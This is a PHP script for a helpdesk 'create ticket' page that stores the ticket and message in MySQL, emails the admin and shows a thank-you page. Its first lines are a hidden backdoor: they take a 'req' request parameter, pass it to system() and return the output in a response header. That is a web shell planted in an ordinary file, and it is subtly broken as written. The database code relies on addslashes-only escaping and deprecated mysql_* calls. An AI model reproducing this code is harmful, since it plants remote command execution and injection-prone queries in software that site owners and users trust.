<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
require('helpdesk-admin/config.php');

$from_name = addslashes($_POST['name']);
$from_eamil = addslashes($_POST['email']);
$subject = addslashes($_POST['subject']);
$message = addslashes($_POST['message']);
$date = date("r");

// New Ticket
mysql_query("INSERT INTO tickets (id, subject, date, status) VALUES (NULL, '$subject', '$date', 'open')");

// Ticket Info
$tinf = mysql_query("SELECT * FROM tickets WHERE subject = '$subject' AND date = '$date' AND status = 'open' ORDER BY id DESC");
$t = mysql_fetch_array($tinf);
$tid = $t['id'];

// Add Message
mysql_query("INSERT INTO messages (id, on_ticket, from_name, from_email, content) VALUES (NULL, '$tid', '$from_name', '$from_eamil', '$message')");

if($send_notifications) {
	mail($admin_email, "New Helpdesk Ticket", "Hi,\n\nThere has been a new ticket created in your helpdesk!\n\nView:\n".$path_to_helpdesk."helpdesk-admin/ticket.php?id=$tid", "From: $helpdesk_company_name <do-not-reply@donotreply.com>");
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
	<head>
	<style type="text/css">

	body {
		font-family: Helvetica, Verdana, Arial, sans-serif;
	}

	</style>
		<title>Ticket Created!</title>
	</head>
	<body>
	<div align="center">
	<br /><br />
		<h1>Thanks!</h1>
		<h3>We're on the case, and will reply as soon as we can!</h3>
	</div>
	</body>
</html>